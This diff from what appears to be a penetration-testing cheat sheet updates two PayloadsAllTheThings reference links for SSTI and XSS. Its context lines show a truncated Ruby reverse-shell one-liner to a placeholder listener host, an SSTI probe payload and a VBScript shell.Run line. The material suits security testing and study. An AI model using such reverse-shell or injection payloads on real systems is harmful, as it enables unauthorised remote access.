@@ -1520,7 +1520,7 @@ $ ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/s
 
 ## Server-Side Template Injection (SSTI)
 
-> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+> https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/
 
 ```console
 {{2*2}}[[3*3]]
@@ -1630,7 +1630,7 @@ shell.Run("C:\Windows\System32\calc.exe" & WScript.ScriptFullName),0,True
 
 ## Cross-Site Scripting (XSS)
 
-> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+> https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/
 
 ### Common Payloads
 
